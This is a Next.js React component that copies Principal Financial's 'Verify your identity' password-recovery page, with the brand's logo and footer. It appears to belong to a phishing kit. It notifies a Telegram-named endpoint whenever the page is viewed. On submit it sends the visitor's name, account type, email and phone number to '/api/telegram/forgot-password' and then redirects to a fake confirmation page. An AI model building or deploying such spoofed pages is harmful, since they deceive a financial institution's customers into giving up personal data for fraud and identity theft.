"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import principalLogo from "../Principal/images/principal logo.png";

export function PrincipalForgotForm() {
  const router = useRouter();
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [accountType, setAccountType] = useState("retirement");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const hasNotifiedView = useRef(false);

  useEffect(() => {
    if (hasNotifiedView.current) return;
    hasNotifiedView.current = true;
    fetch("/api/telegram/forgot-password-view", { method: "POST" }).catch(console.error);
  }, []);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ firstName, lastName, accountType, email, phone }),
      }).catch(console.error);
    } finally {
      await new Promise((resolve) => setTimeout(resolve, 1500));
      router.push("/forgot-password-found");
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#292929]">
      <header className="flex h-20 items-center justify-between border-b border-gray-300 bg-white px-6 shadow-lg lg:px-10">
        <img src={principalLogo.src} alt="Principal" className="h-auto w-44 object-contain" />
        <button type="button" onClick={() => router.push("/")} className="flex h-14 min-w-[150px] items-center justify-center rounded-full bg-[#087cc1] px-8 text-[20px] font-bold text-white hover:bg-blue-600">
          Log in
        </button>
      </header>

      <main className="flex-1">
        <section className="mx-auto w-full max-w-md px-6 pb-24 pt-20">
          <h1 className="text-[45px] font-light leading-[1.2] text-black">Verify your identity</h1>

          <form className="mt-[45px]" onSubmit={handleSubmit}>
            <div>
              <label htmlFor="firstName" className="mb-2 block text-[20px] font-normal text-[#555]">First name <span className="text-[#9b3f3f]">*</span></label>
              <input id="firstName" type="text" required value={firstName} onChange={(event) => setFirstName(event.target.value)} className="h-14 w-full rounded-md border border-black bg-white px-4 text-[20px] text-[#444] outline-none focus:border-[#2f79bd] focus:ring-1 focus:ring-[#2f79bd]" />
            </div>

            <div className="mt-[34px]">
              <label htmlFor="lastName" className="mb-2 block text-[20px] font-normal text-[#555]">Last name <span className="text-[#9b3f3f]">*</span></label>
              <input id="lastName" type="text" required value={lastName} onChange={(event) => setLastName(event.target.value)} className="h-14 w-full rounded-md border border-black bg-white px-4 text-[20px] text-[#444] outline-none focus:border-[#2f79bd] focus:ring-1 focus:ring-[#2f79bd]" />
            </div>

            <div className="mt-[34px]">
              <p className="mb-4 text-[20px] font-normal text-[#555]">Select one of the following <span className="text-[#9b3f3f]">*</span></p>
              <label className="flex cursor-pointer items-start gap-3 text-[20px] leading-[1.5] text-[#555]">
                <input type="radio" name="accountType" value="retirement" checked={accountType === "retirement"} onChange={(event) => setAccountType(event.target.value)} className="mt-1 h-5 w-5 shrink-0 accent-[#347bb9]" />
                <span>I have a retirement account or insurance<br className="hidden sm:block" /> policy with Principal.</span>
              </label>
              <label className="mt-4 flex cursor-pointer items-start gap-3 text-[20px] leading-[1.5] text-[#555]">
                <input type="radio" name="accountType" value="business" checked={accountType === "business"} onChange={(event) => setAccountType(event.target.value)} className="mt-1 h-5 w-5 shrink-0 accent-[#347bb9]" />
                <span>I do business with Principal.</span>
              </label>
            </div>

            <div className="mt-[35px]">
              <label htmlFor="email" className="mb-2 block text-[20px] font-normal text-[#555]">Email address <span className="text-[#9b3f3f]">*</span></label>
              <input id="email" type="email" required value={email} onChange={(event) => setEmail(event.target.value)} className="h-14 w-full rounded-md border border-black bg-white px-4 text-[20px] text-[#444] outline-none focus:border-[#2f79bd] focus:ring-1 focus:ring-[#2f79bd]" />
            </div>

            <div className="mt-[34px]">
              <label htmlFor="phone" className="mb-1 block text-[20px] font-normal text-[#555]">Phone number <span className="text-[#9b3f3f]">*</span></label>
              <p className="mb-2 text-[20px] text-[#777]">Valid format is (XXX) XXX-XXXX</p>
              <div className="flex h-14 w-full items-center rounded-md border border-black bg-white">
                <span className="px-3 text-[20px]">🇺🇸 <span className="text-[11px]">▼</span></span>
                <input id="phone" type="tel" required placeholder="(201) 555-0123" value={phone} onChange={(event) => setPhone(event.target.value)} className="h-full flex-1 bg-transparent px-2 text-[20px] text-[#444] outline-none placeholder:text-[#777]" />
              </div>
            </div>

            <div className="mt-[42px] flex flex-col items-center">
              <button type="submit" disabled={isLoading} className="h-14 min-w-[155px] rounded-full bg-[#087cc1] px-8 text-[20px] font-semibold text-white transition hover:bg-[#066ca8] disabled:opacity-60">{isLoading ? "Loading..." : "Continue"}</button>
              <button type="button" onClick={() => router.push("/")} className="mt-8 border-b border-dotted border-[#4f718c] pb-1 text-[20px] text-[#4f718c] hover:text-[#087cc1]">Cancel</button>
            </div>
          </form>
        </section>
      </main>

      <footer className="bg-[#303030] px-4 py-12 text-white lg:px-10 lg:py-20">
        <div className="mb-10 lg:mb-16"><p className="text-xl">Trouble logging in? <a href="#" className="font-bold underline underline-offset-4">Get help</a></p></div>
        <nav className="mb-12 flex flex-col gap-7 text-xl lg:mb-7 lg:flex-row lg:items-center lg:gap-10"><a href="#" className="hover:underline">Terms of use</a><a href="#" className="hover:underline">Disclosures</a><a href="#" className="hover:underline">Privacy</a><a href="#" className="hover:underline">Security</a><a href="#" className="hover:underline">Report fraud</a></nav>
        <div className="border-t border-white pb-6 pt-8 lg:flex lg:items-end lg:justify-between"><div><p className="mb-5 text-lg">©2026 Principal Financial Services, Inc.</p><p className="text-lg leading-relaxed">Securities offered through Principal Securities, Inc., <span className="font-semibold underline underline-offset-4">member SIPC</span></p></div><div className="mt-10 flex items-center gap-8 lg:mb-10 lg:mt-0"><a href="#" aria-label="Facebook" className="hover:opacity-80"><i className="fa-brands fa-facebook text-[34px]" /></a><a href="#" aria-label="X" className="hover:opacity-80"><i className="fa-brands fa-x-twitter text-[34px]" /></a><a href="#" aria-label="YouTube" className="hover:opacity-80"><i className="fa-brands fa-youtube text-[34px]" /></a><a href="#" aria-label="LinkedIn" className="hover:opacity-80"><i className="fa-brands fa-linkedin text-[34px]" /></a></div></div>
      </footer>
    </div>
  );
}
